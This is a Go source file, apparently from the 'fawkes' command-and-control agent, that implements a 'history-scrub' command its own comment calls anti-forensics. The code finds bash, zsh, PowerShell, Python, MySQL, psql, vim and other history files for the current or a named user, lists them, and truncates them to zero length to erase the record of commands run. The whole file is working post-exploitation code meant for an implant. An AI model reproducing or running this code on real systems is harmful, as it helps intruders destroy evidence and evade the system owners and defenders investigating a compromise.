package commands

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"runtime"
	"strings"

	"fawkes/pkg/structs"
)

// HistoryScrubCommand implements the history-scrub command for anti-forensics.
type HistoryScrubCommand struct{}

func (c *HistoryScrubCommand) Name() string        { return "history-scrub" }
func (c *HistoryScrubCommand) Description() string { return "Clear shell and application command history" }

// HistoryScrubParams holds the parsed parameters.
type HistoryScrubParams struct {
	Action string `json:"action"` // "list", "clear", "clear-all"
	User   string `json:"user"`   // target user (empty = current user)
}

func (c *HistoryScrubCommand) Execute(task structs.Task) structs.CommandResult {
	var params HistoryScrubParams
	if task.Params != "" {
		if err := json.Unmarshal([]byte(task.Params), &params); err != nil {
			return structs.CommandResult{
				Output:    fmt.Sprintf("Error parsing parameters: %v", err),
				Status:    "error",
				Completed: true,
			}
		}
	}

	params.Action = strings.ToLower(params.Action)
	if params.Action == "" {
		params.Action = "list"
	}

	switch params.Action {
	case "list":
		return historyList(params.User)
	case "clear":
		return historyClear(params.User, false)
	case "clear-all":
		return historyClear(params.User, true)
	default:
		return structs.CommandResult{
			Output:    fmt.Sprintf("Unknown action '%s'. Use 'list', 'clear', or 'clear-all'.", params.Action),
			Status:    "error",
			Completed: true,
		}
	}
}

// historyFile represents a found history file.
type historyFile struct {
	Path  string
	Type  string // e.g. "bash", "zsh", "powershell", "python"
	Size  int64
	Lines int
}

// getHomeDir returns the target home directory.
func getTargetHome(user string) string {
	if user != "" {
		if runtime.GOOS == "windows" {
			return fmt.Sprintf("C:\\Users\\%s", user)
		}
		return fmt.Sprintf("/home/%s", user)
	}
	if home, err := os.UserHomeDir(); err == nil {
		return home
	}
	if h := os.Getenv("HOME"); h != "" {
		return h
	}
	if h := os.Getenv("USERPROFILE"); h != "" {
		return h
	}
	return ""
}

// historyTargets returns paths to check for history files relative to a home dir.
func historyTargets(home string) []struct {
	path    string
	htype   string
} {
	var targets []struct {
		path  string
		htype string
	}

	if runtime.GOOS == "windows" {
		// PowerShell ConsoleHost history
		appData := os.Getenv("APPDATA")
		if appData == "" && home != "" {
			appData = filepath.Join(home, "AppData", "Roaming")
		}
		if appData != "" {
			targets = append(targets, struct{ path, htype string }{
				filepath.Join(appData, "Microsoft", "Windows", "PowerShell", "PSReadLine", "ConsoleHost_history.txt"),
				"powershell",
			})
		}
		// cmd.exe doesn't persist history to disk by default
	} else {
		// Unix shell history files
		unixFiles := []struct {
			name  string
			htype string
		}{
			{".bash_history", "bash"},
			{".zsh_history", "zsh"},
			{".sh_history", "sh"},
			{".history", "generic"},
			{".ksh_history", "ksh"},
			{".fish_history", "fish"},
			{".python_history", "python"},
			{".node_repl_history", "node"},
			{".mysql_history", "mysql"},
			{".psql_history", "psql"},
			{".sqlite_history", "sqlite"},
			{".lesshst", "less"},
			{".viminfo", "vim"},
			{".wget-hsts", "wget"},
		}
		for _, f := range unixFiles {
			targets = append(targets, struct{ path, htype string }{
				filepath.Join(home, f.name),
				f.htype,
			})
		}
	}

	return targets
}

// findHistoryFiles locates all existing history files.
func findHistoryFiles(user string) []historyFile {
	home := getTargetHome(user)
	if home == "" {
		return nil
	}

	var found []historyFile
	for _, t := range historyTargets(home) {
		info, err := os.Stat(t.path)
		if err != nil {
			continue
		}
		hf := historyFile{
			Path: t.path,
			Type: t.htype,
			Size: info.Size(),
		}
		// Count lines for reasonable-sized files
		if info.Size() < 10*1024*1024 { // <10MB
			if data, err := os.ReadFile(t.path); err == nil {
				hf.Lines = strings.Count(string(data), "\n")
			}
		}
		found = append(found, hf)
	}

	return found
}

func historyList(user string) structs.CommandResult {
	files := findHistoryFiles(user)
	if len(files) == 0 {
		target := "current user"
		if user != "" {
			target = user
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("No history files found for %s", target),
			Status:    "success",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString("History Files Found\n")
	sb.WriteString("===================\n\n")
	sb.WriteString(fmt.Sprintf("%-14s %-10s %8s  %s\n", "Type", "Lines", "Size", "Path"))
	sb.WriteString(fmt.Sprintf("%-14s %-10s %8s  %s\n", "----", "-----", "----", "----"))

	totalSize := int64(0)
	totalLines := 0
	for _, f := range files {
		sb.WriteString(fmt.Sprintf("%-14s %-10d %8s  %s\n", f.Type, f.Lines, formatFileSize(f.Size), f.Path))
		totalSize += f.Size
		totalLines += f.Lines
	}
	sb.WriteString(fmt.Sprintf("\n[%d history files, %d total lines, %s total]\n", len(files), totalLines, formatFileSize(totalSize)))

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    "success",
		Completed: true,
	}
}

func historyClear(user string, clearAll bool) structs.CommandResult {
	files := findHistoryFiles(user)
	if len(files) == 0 {
		target := "current user"
		if user != "" {
			target = user
		}
		return structs.CommandResult{
			Output:    fmt.Sprintf("No history files found for %s", target),
			Status:    "success",
			Completed: true,
		}
	}

	var sb strings.Builder
	sb.WriteString("History Scrub Results\n")
	sb.WriteString("=====================\n\n")

	cleared := 0
	failed := 0
	for _, f := range files {
		// Skip non-shell types unless clear-all
		if !clearAll {
			switch f.Type {
			case "bash", "zsh", "sh", "ksh", "fish", "powershell", "generic":
				// These are shell history — always clear
			default:
				// Skip application-specific history unless clear-all
				sb.WriteString(fmt.Sprintf("[SKIP] %s (%s) — use 'clear-all' to include\n", f.Path, f.Type))
				continue
			}
		}

		// Truncate the file to zero length (preserves file, removes content)
		if err := os.Truncate(f.Path, 0); err != nil {
			sb.WriteString(fmt.Sprintf("[FAIL] %s — %v\n", f.Path, err))
			failed++
		} else {
			sb.WriteString(fmt.Sprintf("[OK]   %s (%s, %d lines cleared)\n", f.Path, f.Type, f.Lines))
			cleared++
		}
	}

	sb.WriteString(fmt.Sprintf("\n[%d files cleared, %d failed]\n", cleared, failed))

	status := "success"
	if failed > 0 && cleared == 0 {
		status = "error"
	}

	return structs.CommandResult{
		Output:    sb.String(),
		Status:    status,
		Completed: true,
	}
}

